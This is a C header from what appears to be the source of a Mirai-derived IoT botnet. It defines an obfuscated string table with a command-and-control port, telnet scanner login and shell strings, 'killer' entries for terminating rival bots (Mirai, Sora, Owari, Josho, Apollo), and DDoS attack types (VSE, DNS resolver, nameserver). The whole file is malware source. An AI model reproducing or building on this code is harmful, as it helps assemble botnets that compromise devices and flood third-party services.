#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};

#define TABLE_CNC_PORT 1
#define TABLE_SCAN_CB_PORT 2
#define TABLE_EXEC_SUCCESS 3
#define TABLE_SCAN_SHELL 4
#define TABLE_SCAN_ENABLE 5
#define TABLE_SCAN_SYSTEM 6
#define TABLE_SCAN_SH 7
#define TABLE_SCAN_QUERY 8
#define TABLE_SCAN_RESP 9
#define TABLE_SCAN_NCORRECT 10
#define TABLE_SCAN_PS 11
#define TABLE_SCAN_KILL_9 12
#define TABLE_SCAN_OGIN 13
#define TABLE_SCAN_ENTER 14
#define TABLE_SCAN_ASSWORD 15
#define TABLE_KILLER_PROC 16
#define TABLE_KILLER_EXE 17
#define TABLE_KILLER_FD 18
#define TABLE_KILLER_MAPS 19
#define TABLE_KILLER_TCP 20
#define TABLE_EXEC_MIRAI 21
#define TABLE_EXEC_SORA1 22
#define TABLE_EXEC_SORA2 23
#define TABLE_EXEC_OWARI 24
#define TABLE_EXEC_JOSHO 25
#define TABLE_EXEC_APOLLO 26
#define TABLE_IOCTL_KEEPALIVE1 27
#define TABLE_IOCTL_KEEPALIVE2 28
#define TABLE_IOCTL_KEEPALIVE3 29
#define TABLE_IOCTL_KEEPALIVE4 30
#define TABLE_TEXT_TMP 31
#define TABLE_TEXT_NODIR 32
#define TABLE_TEXT_ROOT 33
#define TABLE_TEXT_HOME 34
#define TABLE_RANDOM 35
#define TABLE_ATK_VSE 36
#define TABLE_ATK_RESOLVER 37
#define TABLE_ATK_NSERV 38

#define TABLE_MAX_KEYS 39

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
